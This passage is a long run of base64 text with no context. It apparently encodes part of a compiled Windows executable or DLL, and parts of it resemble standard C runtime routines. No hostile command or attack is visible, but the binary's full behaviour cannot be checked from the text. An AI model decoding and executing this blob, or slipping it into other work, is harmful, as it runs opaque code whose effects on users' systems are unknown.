UIZosIg8ACZoXJdfUrRQjR+Ehdw1WL7ItFCIXAeCGD+AJ+DYP4A3UXiw30pgEQ6wuLDfSmARCj9KYBEIvBXcPo3aH//8cAFgAAAOhjof//g8j/XcPMzFWL7IPsJKEAiAEQM8WJRfyLRQhTix0s8AAQVleJReQz9otFDFaJReD/04v4iX3o6CrU//+JRew5NfimARAPhbAAAABoAAgAAFZoRA4BEP8V3PAAEIv4hf91Jv8VOPAAEIP4Vw+FagEAAFZWaEQOARD/FdzwABCL+IX/D4RTAQAAaFwOARBX/xVc8AAQhcAPhD8BAABQ/9NoaA4BEFej+KYBEP8VXPAAEFD/02h4DgEQV6P8pgEQ/xVc8AAQUP/TaIwOARBXowCnARD/FVzwABBQ/9OjCKcBEIXAdBRoqA4BEFf/FVzwABBQ/9OjBKcBEIt96P8VRPAAEIXAdBuLReSFwHQHUP8V5PAAEDl17HQdagRY6b0AAAA5dex0EP81+KYBEP8VMPAAEGoD6+WhBKcBEIsdMPAAEDvHdE85PQinARB0R1D/0/81CKcBEIlF7P/Ti03siUXohcl0L4XAdCv/0YXAdBqNTdxRagyNTfBRagFQ/1XohcB0BvZF+AF1C4t9EIHPAAAgAOswofymARA7x3QkUP/ThcB0Hf/Qi/CF9nQVoQCnARA7x3QMUP/ThcB0BVb/0Ivwi30Q/zX4pgEQ/9OFwHQMV/914P915Fb/0OsCM8CLTfxfXjPNW+iMkv//i+Vdw4XAdQZmD+/A6xFmD27AZg9gwGYPYcBmD3DAAFNRi9mD4w+F23V4i9qD4n/B6wd0MGYPfwFmD39BEGYPf0EgZg9/QTBmD39BQGYPf0FQZg9/QWBmD39BcI2JgAAAAEt10IXSdDeL2sHrBHQP6wONSQBmD38BjUkQS3X2g+IPdByL2sHqAnQKZg9+AY1JBEp19oPjA3QGiAFBS3X6WFvD99uDwxAr01KL04PiA3QGiAFBSnX6wesCdApmD34BjUkES3X2Wule////VYvsVot1CFeDz/+F9nUU6Amf///HABYAAADoj57//wvH60X2RgyDdDlW6KPc//9Wi/joPRoAAFbo5t3//1DovBgAAIPEEIXAeQWDz//rE4N+HAB0Df92HOhDm///g2YcAFmDZgwAi8dfXl3Dagxo6EUBEOi3rv//g8//iX3kM8CLdQiF9g+VwIXAdRjojJ7//8cAFgAAAOgSnv//i8fo0a7//8P2RgxAdAaDZgwA6+xW6Fuf//9Zg2X8AFboP////1mL+Il95MdF/P7////oCAAAAOvHi3UIi33kVuifn///WcNqFGgIRgEQ6ECu//8z9ol15It9CIP//nUQ6Bye///HAAkAAADptwAAAIX/D4ifAAAAOz0EqAEQD4OTAAAAi8fB+AWJReCL34PjH8HjBosEhRidARAPvkQDBIPgAXRyV+hdGQAAWYl1/ItF4IsEhRidARD2RAMEAXQoV+hWGgAAWVD/FejwABCFwHUI/xU48AAQi/CJdeSF9nQY6Ged//+JMOiUnf//xwAJAAAAg87/iXXkx0X8/v///+gKAAAAi8brIYt9CIt15FfobhoAAFnD6GWd///HAAkAAADo65z//4PI/+iprf//w2oQaChGARDoV63//zPbiV3ki3UIg/7+dRfo/5z//4kY6Cyd///HAAkAAADptgAAAIX2D4iXAAAAOzUEqAEQD4OLAAAAi97B+wWL/oPnH8HnBosEnRidARAPvkQ4BIPgAXUK6Lac//+DIADralboZhgAAFmDZfwAiwSdGJ0BEPZEOAQBdBP/dRD/dQxW6F4AAACDxAyL+OsW6LSc///HAAkAAADodZz//4MgAIPP/4l95MdF/P7////oCgAAAIvH6yiLdQiLfeRW6IYZAABZw+hJnP//iRjodpz//8cACQAAAOj8m///g8j/6Lqs///DVYvsuPAaAADoNxsAAKEAiAEQM8WJRfyDpUTl//8Ai0UIi00MVjP2iYU45f//VzP/iY0w5f//ibVA5f//OXUQdQczwOkNCAAAhcl1H+jdm///ITDoCpz//8cAFgAAAOiQm///g8j/6eoHAACL0IvIwfoFg+EfweEGiZUo5f//U4sUlRidARCJjSTl//+KXBEkAtvQ+4D7AnQFgPsBdSuLRRD30KgBdRzogpv//yEw6K+b///HABYAAADoNZv//+mIBwAAi4U45f//9kQRBCB0D2oCagBqAFDoqhkAAIPEEP+1OOX//+ii2v//WYXAD4RQAwAAi4Uo5f//i40k5f//iwSFGJ0BEPZEAQSAD4QyAwAA6PWv//8zyYtAbDmIqAAAAI2FGOX//1CLhSjl//8PlMGJjTzl//+LjSTl//+LBIUYnQEQ/zQB/xXw8AAQhcAPhO4CAAA5tTzl//90CITbD4TeAgAA/xXs8AAQi5Uw5f//M8khjTjl//+JhRDl//+JjTTl//+JlSzl//85TRAPhoEGAACLhSzl//8z0omVQOX//8eFFOX//woAAAAhvTzl//+E2w+FrgEAAIoQM8CLjSTl//+A+goPlMCJhRjl//+LhSjl//+LBIUYnQEQiYU85f//OXwBOHQcikQBNIhF9IuFPOX//4hV9WoCIXwBOI1F9FDrWg++wlDoVuT//1mFwHREi4Uw5f//i5Us5f//K8IDRRCD+AEPhtsBAABqAlKNhTTl//9Q6Mnm//+DxAyD+P8PhAUDAACLhSzl//9A/4VA5f//6yZqAf+1LOX//42FNOX//1Domub//4PEDIP4/w+E1gIAAIuFLOX//zPJQP+FQOX//1FRagWJhSzl//+NRfRQagGNhTTl//9QUf+1EOX///8VZPAAEImFPOX//4XAD4SVAgAAagCNjTjl//9Ri40k5f//UI1F9FCLhSjl//+LBIUYnQEQ/zQB/xXE8AAQhcAPhEwBAACLtUDl//+LjUTl//8D8YuFPOX//zmFOOX//w+MSQIAADm9GOX//3RLi40k5f//jYU45f//agBQagGNRfTGRfQNUIuFKOX//4sEhRidARD/NAH/FcTwABCFwA+E7QAAAIO9OOX//wEPjPcBAAD/hUTl//9Gi4005f//6YYAAACA+wF0BYD7AnUzD7cIM9JmO40U5f//iY005f//D5TCg8ACiZU85f//i5VA5f//g8ICiYUs5f//iZVA5f//gPsBdAWA+wJ1S1HoRBcAAFmLjTTl//9mO8F1dYPGAjm9POX//3Qiag1YUImFNOX//+geFwAAWYuNNOX//2Y7wXVPRv+FROX//4uVQOX//4uFLOX//ztVEA+Cqf3//+lFAQAAi50o5f//RooCi5Uk5f//iwydGJ0BEIhECjSLBJ0YnQEQx0QCOAEAAADpFwEAAP8VOPAAEIv46QoBAACLhSjl//+LDIUYnQEQi4Uk5f//9kQIBIAPhHUDAACLlTDl//8z/4m9NOX//4TbD4UOAQAAi10QiZU45f//hdsPhI0DAAAzyY299Ov//4vCiY085f//K4Uw5f//O8NzRIoKQkCIjR/l//+A+QqJlTjl//+LjTzl//91C/+FROX//8YHDUdBipUf5f//iBdHi5U45f//QYmNPOX//4H5/xMAAHK4i40k5f//jYX06///K/iNhSDl//9qAFBXjYX06///UIuFKOX//4sEhRidARD/NAH/FcTwABCFwA+EE////wO1IOX//zm9IOX//3wWi5U45f//i8IrhTDl//87ww+CQf///4u9NOX//4uNROX//4X2D4X1AgAAhf8PhKwCAABqBVs7+w+FmAIAAOjvlv//xwAJAAAA6LCW//+JGOnGAgAAi8qA+wIPheoAAAA5dRAPhnwCAADHhRTl//8KAAAAg6UY5f//AI2d9Ov//4vBag0rwouVGOX//147RRBzMw+3OYPAAoPBAmY7vRTl//91EIOFROX//wJmiTODwwKDwgJmiTuDwgKDwwKB+v4TAAByyI2F9Ov//4mNPOX//4uNJOX//yvYagCNhSDl//9QU42F9Ov//1CLhSjl//+LBIUYnQEQ/zQB/xXE8AAQi7VA5f//i7005f//hcAPhPL9//8DtSDl//+JtUDl//85nSDl//8PjPH+//+LjTzl//+LwYuVMOX//yvCO0UQD4Iu////6dP+//+LXRCJjTjl//+F2w+EigEAAMeFFOX//woAAACDpRjl//8AjYVI5f//i7045f//K8qLlRjl//87y3M7D7c3g8ECg8cCib045f//Zju1FOX//3USag1fZok4g8ACi7045f//g8ICZokwg8ICg8ACgfqoBgAAcsEz9o2NnPL//1ZWaFUNAABRjY1I5f//K8GZK8LR+FCLwVBWaOn9AAD/FWTwABCLtUDl//+LvTTl//+JhTzl//+FwA+EAP3//zPJiY1A5f//agArwY2VIOX//1JQjYWc8v//A8GLjSTl//9Qi4Uo5f//iwSFGJ0BEP80Af8VxPAAEIXAdB6LjUDl//8DjSDl//+LhTzl//+JjUDl//87wX+v6xr/FTjwABCLjUDl//+L+IuFPOX//4m9NOX//zvBD4+a/f//i4045f//i/GLlTDl//8r8om1QOX//zvzD4LE/v//6Xf9//9qAI2VIOX//1L/dRD/tTDl////NAj/FcTwABCFwA+EPfz//4u1IOX//zP/6Uf9//9X6DWU//9Z6zyLlTDl//+LhSjl//+LjSTl//+LBIUYnQEQ9kQBBEB0CYA6GnUEM8DrHOgllP//xwAcAAAA6OaT//+DIACDyP/rBCvxi8Zbi038XzPNXuikhv//i+Vdw1WL7FaLdQiF9g+E6gAAAItGDDsFNJUBEHQHUOhgkP//WYtGEDsFOJUBEHQHUOhOkP//WYtGFDsFPJUBEHQHUOg8kP//WYtGGDsFQJUBEHQHUOgqkP//WYtGHDsFRJUBEHQHUOgYkP//WYtGIDsFSJUBEHQHUOgGkP//WYtGJDsFTJUBEHQHUOj0j///WYtGODsFYJUBEHQHUOjij///WYtGPDsFZJUBEHQHUOjQj///WYtGQDsFaJUBEHQHUOi+j///WYtGRDsFbJUBEHQHUOisj///WYtGSDsFcJUBEHQHUOiaj///WYtGTDsFdJUBEHQHUOiIj///WV5dw1WL7FaLdQiF9nRZiwY7BSiVARB0B1DoaY///1mLRgQ7BSyVARB0B1DoV4///1mLRgg7BTCVARB0B1DoRY///1mLRjA7BViVARB0B1DoM4///1mLRjQ7BVyVARB0B1DoIY///1leXcNVi+xWi3UIhfYPhG4DAAD/dgToBo////92COj+jv///3YM6PaO////dhDo7o7///92FOjmjv///3YY6N6O////NujXjv///3Yg6M+O////diTox47///92KOi/jv///3Ys6LeO////djDor47///92NOinjv///3Yc6J+O////djjol47///92POiPjv//g8RA/3ZA6ISO////dkTofI7///92SOh0jv///3ZM6GyO////dlDoZI7///92VOhcjv///3ZY6FSO////dlzoTI7///92YOhEjv///3Zk6DyO////dmjoNI7///92bOgsjv///3Zw6CSO////dnToHI7///92eOgUjv///3Z86AyO//+DxED/toAAAADo/o3///+2hAAAAOjzjf///7aIAAAA6OiN////towAAADo3Y3///+2kAAAAOjSjf///7aUAAAA6MeN////tpgAAADovI3///+2nAAAAOixjf///7agAAAA6KaN////tqQAAADom43///+2qAAAAOiQjf///7a4AAAA6IWN////trwAAADoeo3///+2wAAAAOhvjf///7bEAAAA6GSN////tsgAAADoWY3//4PEQP+2zAAAAOhLjf///7a0AAAA6ECN////ttQAAADoNY3///+22AAAAOgqjf///7bcAAAA6B+N////tuAAAADoFI3///+25AAAAOgJjf///7boAAAA6P6M////ttAAAADo84z///+27AAAAOjojP///7bwAAAA6N2M////tvQAAADo0oz///+2+AAAAOjHjP///7b8AAAA6LyM////tgABAADosYz///+2BAEAAOimjP//g8RA/7YIAQAA6JiM////tgwBAADojYz///+2EAEAAOiCjP///7YUAQAA6HeM////thgBAADobIz///+2HAEAAOhhjP///7YgAQAA6FaM////tiQBAADoS4z///+2KAEAAOhAjP///7YsAQAA6DWM////tjABAADoKoz///+2NAEAAOgfjP///7Y4AQAA6BSM////tjwBAADoCYz///+2QAEAAOj+i////7ZEAQAA6POL//+DxED/tkgBAADo5Yv///+2TAEAAOjai////7ZQAQAA6M+L////tlQBAADoxIv///+2WAEAAOi5i////7ZcAQAA6K6L////tmABAADoo4v//4PEHF5dw1WL7FFRoQCIARAzxYlF/FNWi3UYV4X2fiGLRRSLzkmAOAB0CECFyXX1g8n/i8YrwUg7xo1wAXwCi/CLTSQz/4XJdQ2LRQiLAItABIvIiUUkM8A5RShqAGoAVv91FA+VwI0ExQEAAABQUf8VYPAAEIvIiU34hcl1BzPA6XEBAAB+V2rgM9JY9/GD+AJySwPJjUEIO8F2P4tF+I0ERQgAAAA9AAQAAHcT6NANAACL3IXbdB7HA8zMAADrE1DoPYj//4vYWYXbdAnHA93dAACDwwiLTfjrBYtN+DPbhdt0mlFTVv91FGoB/3Uk/xVg8AAQhcAPhPAAAACLdfhqAGoAVlP/dRD/dQzoNwcAAIv4g8QYhf8PhM8AAAD3RRAABAAAdCyLTSCFyQ+EuwAAADv5D4+zAAAAUf91HFZT/3UQ/3UM6P0GAACDxBjpmgAAAIX/fk9q4DPSWPf3g/gCckONDD+NQQg7wXY5jQR9CAAAAD0ABAAAdxPoAg0AAIv0hfZ0Z8cGzMwAAOsTUOhvh///i/BZhfZ0UscG3d0AAIPGCOsCM/aF9nRBi0X4V1ZQU/91EP91DOiKBgAAg8QYhcB0ITPAUFA5RSB1BFBQ6wb/dSD/dRxXVlD/dST/FWTwABCL+FboZAAAAFlT6F0AAABZi8eNZexfXluLTfwzzei9f///i+Vdw1WL7IPsEP91CI1N8O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